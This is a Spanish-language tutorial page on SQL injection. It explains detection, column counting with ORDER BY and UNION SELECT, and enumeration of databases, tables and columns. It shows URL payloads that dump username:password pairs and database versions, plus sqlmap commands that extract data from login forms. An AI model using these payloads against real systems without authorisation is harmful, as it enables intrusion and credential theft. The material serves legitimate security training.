# SQL Injection (SQLi)

## ¿Que es una inyección SQL?

Imagina que tienes una web en la que hay usuarios registrados, esta información (usuario, correo, contraseña...) se almacena en una base de datos, para poder usar la base de datos en la web, y cuando por ejemplo tu insertes tu usuario y contraseña, esta compare los datos con los de la base de datos, para ello hay que implementarlo a nivel de código, pero existen métodos, para evadir el código que hay por detrás, y ejecutar las consultas que quieras a la base de datos.

## SQLi Manuales

### Descubrimiento de SQLi

#### Uso de SELECT

Existen varias formas de detectar una inyección SQL:

* Añadiendo el carácter `'` al final de un parámetro para cerrar la comilla que está detrás en el código, por ejemplo

```sql
SELECT nombre,precio FROM artículos WHERE categoría = 'Bañadores'
```

Por ejemplo en esta consulta, selecciona las columnas nombre y precio de la tabla `artículos` donde la categoría sea Bañadores, esta sea la tabla que hay por detrás:

<table><thead><tr><th>Nombre</th><th data-type="number">Precio</th><th>Categoría</th></tr></thead><tbody><tr><td>Gafas Buceo</td><td>13</td><td>Gafas</td></tr><tr><td>Bikini</td><td>20</td><td>Bañadores</td></tr><tr><td>Bañador Adulto</td><td>33</td><td>Bañadores</td></tr><tr><td>Gorro Azul</td><td>5</td><td>Gorros</td></tr></tbody></table>

En el lado de la web, nos mostraría solo el Bikini y el Bañador Adulto con el precio. Por ejemplo, así se vería una inyección en la URL

{% code title="URL Normal" %}
```
https://mitienda.com/products?categoria=Bañadores
```
{% endcode %}

{% code title="Consulta que se ejecuta" %}
```sql
SELECT nombre,precio FROM artículos WHERE categoría = 'Bañadores'
```
{% endcode %}

* Añadiendo una comilla `'` y `-- -` (Estos guiones sirven para comentar todo lo que haya después de eso) al parámetro:

```
https://mitienda.com/products?categoria=Bañadores'-- -
```

```sql
SELECT nombre,precio FROM artículos WHERE categoría = 'Bañadores'-- -'
```

* Añadiendo parámetros booleanos ej. `OR 1=1`, `OR 1=2`. Esto hace que la pagina pueda mostrar una respuesta diferente, y si lo hace significa que es vulnerable a una inyección sql

### Inyecciones SQL UNION

{% hint style="info" %}
El operador `UNION` se usa para ejecutar uno o más consultas `SELECT` y añade los resultados a la consulta original

Por ejemplo, la siguiente consulta, devuelve un único conjunto de resultados con dos columnas, que contiene valores de columnas `a` y `b` en `tabla1` y columnas `c` y `d` en `tabla2`:

```sql
SELECT a, b FROM tabla1 UNION SELECT c, d FROM tabla2
```
{% endhint %}

{% hint style="warning" %}
Para que la consulta con `UNION` funcione, se deben cumplir dos requisitos clave:

* Las consultas individuales **deben devolver el mismo número de columnas**.
* **Los tipos de datos en cada columna deben ser compatibles** entre las consultas individuales.

Ósea, que previamente deberemos:

* Saber **cuántas columnas se devuelven** desde la consulta original.
* Saber **qué columnas devueltas desde la consulta original son de un tipo de datos adecuado** para contener los resultados de la consulta inyectada.
{% endhint %}

#### Determinando el número de columnas

Cuando hablamos de una SQLi usando la cláusula `UNION`, existen dos métodos efectivos para determinar cuántas columnas se devuelven desde la consulta original.

1.  Un método implica inyectar una serie de cláusulas `ORDER BY` e incrementar el índice de columna especificado hasta que se produzca un error. Por ejemplo, si el punto de inyección es una cadena citada dentro del `WHERE` cláusula de la consulta original, usted enviaría:\


    ```sql
    ' ORDER BY 1--
    ' ORDER BY 2--
    ' ORDER BY 3--
    etc.
    ```

    \
    Esta serie de payloads modifica la consulta original para ordenar los resultados por diferentes columnas en el conjunto de resultados.\
    Cuando el índice de columna especificado excede el número de columnas reales en el conjunto de resultados, la base de datos devuelve un error, como:\
    `The ORDER BY position number 3 is out of range of the number of items in the select list.`\

2.  El segundo método implica presentar una serie de payloads `UNION SELECT` que especifican un número diferente de valores nulos:\


    ```sql
    ' UNION SELECT NULL--
    ' UNION SELECT NULL,NULL--
    ' UNION SELECT NULL,NULL,NULL--
    etc.
    ```

    \
    Si el número de nulos no coincide con el número de columnas, la base de datos devuelve un error, como:\
    `All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`\
    \
    Empleamos `NULL` como valores de retorno de la consulta `SELECT` inyectada porque **los tipos de datos de cada columna deben ser compatibles entre la consulta original y la inyectada**. Dado que **NULL es convertible a cualquier tipo de dato común**, se maximiza la probabilidad de que la carga útil funcione siempre y cuando el número de columnas sea correcto.\


    Al igual que ocurre con la técnica de `ORDER BY`, la aplicación podría devolver en su respuesta HTTP el mensaje de error de la base de datos; no obstante, también cabe la posibilidad de que muestre un error genérico o sencillamente no devuelva ningún resultado. \
    \
    **Cuando la cantidad de `NULL` coincide con el número de columnas, la base de datos añade una fila extra** al conjunto de resultados, con valores `NULL` en todas sus columnas. \
    El impacto que esto tenga en la respuesta HTTP dependerá del código de la aplicación: si tienes suerte, encontrarás contenido adicional (por ejemplo, una fila más en una tabla HTML). \
    \
    En caso contrario, esos valores `NULL` pueden provocar un error distinto, como una `NullPointerException`. Y si llega a darse el peor escenario, la respuesta podría ser idéntica a la que se obtendría por un número incorrecto de `NULL`, lo cual inutilizaría este método.

<details>

<summary>Explicación extendida - ¿Las filas de NULL, se escriben en la tabla?</summary>

## ¿Las filas de NULL, se escriben en la tabla?

Un **SELECT** por sí mismo no modifica ninguna tabla; lo que hace la técnica de inyección con `UNION SELECT` es **combinar** (concatenar) el resultado original de la consulta con el resultado que tú inyectas. En otras palabras, no se está “añadiendo físicamente” nada a la base de datos, sino simplemente se extiende —en memoria— el conjunto de filas que devuelve la consulta.

Supongamos que la aplicación ejecuta internamente algo como:

```sql
SELECT columna1, columna2
FROM usuarios
WHERE id = 42
```

y tú logras inyectar esto:

```sql
' UNION SELECT NULL, NULL--
```

El motor de la base de datos lo interpreta como dos subconsultas unidas:

1.  **Primera parte (consulta legítima):**

    ```sql
    SELECT columna1, columna2
    FROM usuarios
    WHERE id = 42
    ```

    —esta puede devolver, por ejemplo, una o varias filas según exista el usuario.
2.  **Segunda parte (tu inyección):**

    ```sql
    SELECT NULL, NULL
    ```

    —esta siempre “devuelve” exactamente una fila con dos columnas, ambas con valor `NULL`.

La cláusula `UNION` (o `UNION ALL`, si se usara) concatena los conjuntos de resultados de ambas subconsultas. El resultado global será:

```
[fila1 de la consulta original]  
[fila2 de la consulta original]  
…  
[última fila de la consulta original]  
[única fila inyectada: (NULL, NULL)]
```

Por eso se dice que “la base de datos añade una fila extra con valores NULL”: esa fila no existe en ninguna tabla, sino que es el **resultado** de la segunda subconsulta (`SELECT NULL,…`) combinada con el resultado original.

– Si la consulta original no devuelve ninguna fila (por ejemplo, porque no hay usuario con id = 42), el motor igual ejecuta la parte `UNION SELECT NULL,…` y por tanto el único renglón que se devuelve es el de tus `NULL`.

– Si la consulta original devuelve varias filas, la fila nula aparece al final (o en medio, dependiendo de ORDER BY o del motor) junto con las demás.

Por eso, cuando haces:

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

lo que estás variando es **el número de `NULL` en la segunda SELECT**, para que coincida con el número de columnas que la primera consulta está devolviendo. Si coinciden (por ejemplo, dos columnas → `SELECT NULL,NULL`), el motor acepta el `UNION` sin error y te da una fila extra con dos valores `NULL`. Si no coinciden (por ejemplo, la aplicación esperaba 3 columnas y tú sólo pones `SELECT NULL,NULL`), el motor devolverá un error de “número de columnas no coincide” y no obtendrás ningún resultado.

</details>

{% hint style="info" %}
## Sintaxis específica de bases de datos Oracle

En Oracle, toda consulta `SELECT` debe incluir la palabra clave `FROM` y especificar una tabla válida. Existe una tabla incorporada en Oracle llamada `DUAL` que se puede usar para este propósito. Por lo tanto, las consultas inyectadas en Oracle deberían tener este aspecto:\


```sql
' UNION SELECT NULL FROM DUAL--
```

\
Los payloads descritos utilizan la secuencia de comentario de doble guion `--` para anular el resto de la consulta original a partir del punto de inyección. En MySQL, la secuencia de doble guion `--` debe ir seguida de un espacio. Alternativamente, se puede usar el carácter almohadilla `#` para indicar un comentario.\
Cheat Sheet de PortSwigger
{% endhint %}

## Usando SQLMap

Para detectar y explotar inyecciones SQL, existe una herramienta automatizada llamada SQLMap.

### Enumeración de las bases de datos

&#x20;Podemos usar el siguiente comando para enumerar bases de datos de un panel de login:

```bash
sqlmap -u http://dominio.com/login --forms --dbs --batch
```

### Enumerando las tablas de una base de datos

&#x20;Podemos usar el siguiente comando para enumerar tablas de una base de datos en específico. Donde "Basededatos" será el nombre de la base de datos de la que queramos enumerar las tablas:

```bash
sqlmap -u http://dominio.com/login --forms -D Basededatos --tables --batch
```

### Enumerando las columnas de una tabla

Podemos usar el siguiente comando para enumerar columnas de una tabla en específico. Donde "Basededatos" será el nombre de la base de datos de la tabla y "Tablaejemplo", será el nombre de la tabla de la que queramos enumerar las columnas:

<pre class="language-bash"><code class="lang-bash"><strong>sqlmap -u http://dominio.com/login --forms -D Basededatos -T Tablajemplo --columns --batch
</strong></code></pre>

### Volcado de los valores de las columnas

Una vez tenemos la base de datos, la tabla y la columna, solo nos falta volcar los datos. Para ello, ejecutamos el siguiente comando. Donde "Basededatos" será el nombre de la base de datos de la tabla y "Tablaejemplo", será el nombre de la tabla y "columna1" será el nombre de la columna de la que queremos ver/volcar los datos:

```bash
sqlmap -u http://dominio.com/login --forms -D Basededatos -T Tablajemplo -C columna1,columna2 --dump --batch
```

## Enumerando tablas

Para poder hacer inyecciones SQL, necesitamos saber cuantas columnas esta empleando la web por detrás, hay diferentes métodos para saberlo:

* Con `order by`, con esto podemos saber cuantas columnas emplea la web dependiendo de la respuesta de la web

```
https://mitienda.com/products?categoria=Bañadores' order by 1,2-- -
```

En el caso de que la web emplee 3 tablas y ejecutasemos esa consulta, veríamos un error, sin embargo si añadimos otro más:

```
https://mitienda.com/products?categoria=Bañadores' order by 1,2,3-- -
```

Podríamos ver una respuesta diferente, en la que se produjese la inyección

* Con `union select`, mediante esto podemos saber cuantas columnas emplea la web, de una manera muy similar al `order by`, solo que en este caso añadimos la palabra NULL:

```
https://mitienda.com/products?categoria=Bañadores' union select NULL,NULL-- -
```

{% hint style="danger" %}
Oracle es algo diferente a otros tipos de BD, en el caso de que queramos probar una SQLi en una BD Oracle, debemos de especificarle una tabla la cual siempre se encuentra en las BD de Oracle que se llama `dual`, por lo que una inyección simple como esta no nos servirá:

```url
https://mitienda.com/products?categoria=Bañadores' union select NULL,NULL-- -
```

Y deberá de ser así:

```url
https://mitienda.com/products?categoria=Bañadores' union select NULL,NULL from dual-- -
```
{% endhint %}

## Enumeración

### Enumerando Bases de Datos

Para enumerar bases de datos existentes a través de una SQLi, una vez hayamos comprobado el numero de columnas que se están empleando en la web, a través de uno de los campos, insertamos una consulta con `union` ej:

<pre class="language-url" data-full-width="false"><code class="lang-url"><strong>https://myshop.com/filter?category=Pets' union select NULL, schema_name from information_schema.schemata-- -
</strong></code></pre>

En el caso de que el campo vulnerable sea el primero sería de la siguiente forma:

<pre data-full-width="false"><code><strong>https://myshop.com/filter?category=Pets' union select schema_name,NULL from information_schema.schemata-- -
</strong></code></pre>

{% code fullWidth="false" %}
```sql
SELECT * FROM products WHERE category = 'Pets' UNION SELECT NULL, schema_name FROM information_schema.schemata-- -'
```
{% endcode %}

En esta inyección, lo que pasará es que la web nos devolverá en este caso (existen 2 columnas) en el campo de la segunda columna el nombre de todas las bases de datos a las que el usuario que ejecuta la consulta por detrás puede leer

{% hint style="warning" %}
Algunas SQLi, no se producen exitosamente ya que no se pueden visualizar los datos en diferentes filas, para ello usamos `group_concat(schema_name)` para poder visualizar los nombres de las BD en una sola fila. Ej.

{% code fullWidth="true" %}
```url
https://myshop.com/filter?category=Pets' union select NULL,group_concat(schema_name) from information_schema.schemata-- -
```
{% endcode %}

En el caso de que tampoco nos deje ver los datos de esta forma, lo haremos de la forma tradicional, que muestra los datos en diferentes filas de la columna con el parámetro vulnerable, pero limitando los datos que nos muestra con `limit 0,1` Ej.

```url
https://myshop.com/filter?category=Pets' union select NULL, schema_name from information_schema.schemata limit 0,1-- -
```

Si de esta manera, nos muestra algún dato, solo tendremos que ir bajando de fila para que muestre otro dato diferente, eso lo hacemos cambiando el primer valor del limit Ej. `limit 1,1`, `limit 2,1`, `limit 3,1` y así sucesivamente
{% endhint %}

### Enumerando Tablas

Una vez sepamos las BBDD a las que podemos acceder, podemos enumerar las tablas existentes de cada BD. Esto lo conseguimos de la siguiente forma:

{% code fullWidth="false" %}
```
https://myshop.com/filter?category=Pets' union select NULL, table_name from information_schema.tables where table_schema = 'Name_BD'-- -
```
{% endcode %}

<pre class="language-sql" data-full-width="false"><code class="lang-sql"><strong>SELECT * FROM products WHERE category = 'Pets' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = 'Name_BD'-- -'
</strong></code></pre>

{% hint style="info" %}
Si ejecutas esta consulta puedes ver todas las tablas de todas las BBDD:

```url
https://myshop.com/filter?category=Pets' union select NULL, table_name from information_schema.tables-- -
```

```sql
SELECT * FROM products WHERE category = 'Pets' UNION SELECT NULL, table_name FROM information_schema.tables-- -'
```
{% endhint %}

#### Oracle

Para enumerar todas las tablas de una BBDD Oracle, lo podemos hacer de la siguiente forma

```url
https://myshop.com/filter?category=Pets' union select NULL, table_name from all_tables-- -
```

```sql
SELECT * FROM products WHERE category = 'Pets' UNION SELECT NULL, table_name FROM all_tables-- -'
```

También podemos filtrar por los usuarios, y posteriormente por las tablas de cada usuario:

```
https://myshop.com/filter?category=Pets' union select NULL, owner from all_tables-- -
```

```sql
SELECT * FROM products WHERE category = 'Pets' UNION SELECT NULL, owner FROM all_tables-- -'
```

Ahora filtramos por las tablas que tiene un usuario:

```
https://myshop.com/filter?category=Pets' union select NULL, table_name from all_tables where owner = 'Admin'
```

```sql
SELECT * FROM products WHERE category = 'Pets' UNION SELECT NULL, table_name FROM all_tables WHERE owner = 'Admin'-- -'
```

### Enumerar las Columnas

Cuando tenemos las BBDD y sus respectivas tablas, ya podremos enumerar las columnas de las respectivas tablas de la siguiente forma:

<pre class="language-url" data-full-width="false"><code class="lang-url"><strong>https://myshop.com/filter?category=Pets' union select NULL, column_name from information_schema.columns where table_schema = 'Name_BD' and table_name = 'Name_Table'-- -
</strong></code></pre>

{% code fullWidth="false" %}
```sql
SELECT * FROM products WHERE category = 'Pets' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_schema = 'Name_BD' AND table_name = 'Name_Table'-- -'
```
{% endcode %}

#### Volcado de las Columnas

Ya que sabemos el nombre de las columnas que hay en la tabla que hemos elegido, podemos volcar los datos para poder visualizarlos de la siguiente manera:

{% code fullWidth="false" %}
```url
https://myshop.com/filter?category=Pets' union select NULL,Column_Name from Table_Name-- -
```
{% endcode %}

<pre class="language-sql" data-full-width="false"><code class="lang-sql"><strong>SELECT * FROM products WHERE category = 'Pets' UNION SELECT NULL,Column_Name FROM Table_Name-- -'
</strong></code></pre>

{% hint style="warning" %}
Debes de tener en cuenta que la tabla debe de estar en la BD que se esta utilizando, en el caso de que la tabla se encuentre en otra BD que hayamos enumero previamente, debemos de indicarle la BD de donde proviene la tabla:

<pre><code><strong>https://myshop.com/filter?category=Pets' union select NULL,Column_Name from BD_Name.Table_Name-- -
</strong></code></pre>

```sql
SELECT * FROM products WHERE category = 'Pets' UNION SELECT NULL,Column_Name FROM BD_Name.Table_Name-- -'
```
{% endhint %}

{% hint style="info" %}
Para saber en que BD te encuentras, puedes hacer esta consulta:

```
https://myshop.com/filter?category=Pets' union select NULL,database()-- -
```

```sql
SELECT * FROM products WHERE category = 'Pets' UNION SELECT NULL,database()-- -'
```
{% endhint %}

Si quisiéramos volcar varios datos de varias columnas en una consulta, lo podemos hacer con `group_concat(Column_Name,Column2_Name)` ej:

```sql
SELECT * FROM users where username = 'usuario123' UNION SELECT NULL,group_concat(username,password) FROM users-- -'
```

{% hint style="info" %}
También puedes concatenar los datos de las columnas y filas con `group_concat()`:

```sql
SELECT * FROM users where username = 'usuario123' UNION SELECT NULL,group_concat(username,':',password) FROM users-- -'
```

De esta manera los datos se verían de la siguiente manera:

* admin:admin123,usuario:usuario123,invitado:contraseña-invitado123

Si de esta manera no puedes concatenar los datos, existen otras formas dependiendo de que tipo de BD se este utilizando (MySQL, Oracle, PostgreSQL, Microsoft), por ejemplo en BBDD de Oracle y PostgreSQL, se hace de la siguiente forma:

```sql
SELECT * FROM users where username = 'usuario123' UNION SELECT NULL,username||':'||password FROM users-- -'
```

Otra forma es con `concat()`:

```sql
SELECT * FROM users where username = 'usuario123' UNION SELECT NULL,concat(username,':',password) FROM users-- -'
```
{% endhint %}

{% hint style="warning" %}
En algunos casos, los dos puntos deben de ser representados en hexadecimal:

```sql
SELECT * FROM users where username = 'usuario123' UNION SELECT NULL,group_concat(username,0x3a
```
{% endhint %}

#### Oracle

Para enumerar las columnas de BBDD Oracle, lo hacemos de la siguiente forma:

```
https://myshop.com/filter?category=Pets' union select NULL, column_name from all_tab_columns where table_name = 'Table_Name'-- -
```

## Volcando tipo y versión de la BD

Podemos volcar el tipo y versión de la BD, una vez sepamos el numero de columnas que tiene la tabla que se esta empleando ya que necesitamos un campo vulnerable para ello, pero dependiendo de ello debemos de hacerlo de una forma u otra.

### Oracle

{% code fullWidth="false" %}
```url
https://mitienda.com/products?categoria=Bañadores' union select NULL,banner from v$version-- -
```
{% endcode %}

{% code fullWidth="false" %}
```
https://mitienda.com/products?categoria=Bañadores' union select NULL,version from v$instance-- -
```
{% endcode %}

### Microsoft y MySQL

{% code fullWidth="false" %}
```
https://mitienda.com/products?categoria=Bañadores' union select NULL,@version-- -
```
{% endcode %}

### PostgreSQL

{% code fullWidth="false" %}
```
https://mitienda.com/products?categoria=Bañadores' union select NULL,version()-- -
```
{% endcode %}

## Blind SQL

### Boolean Based

### Time Based
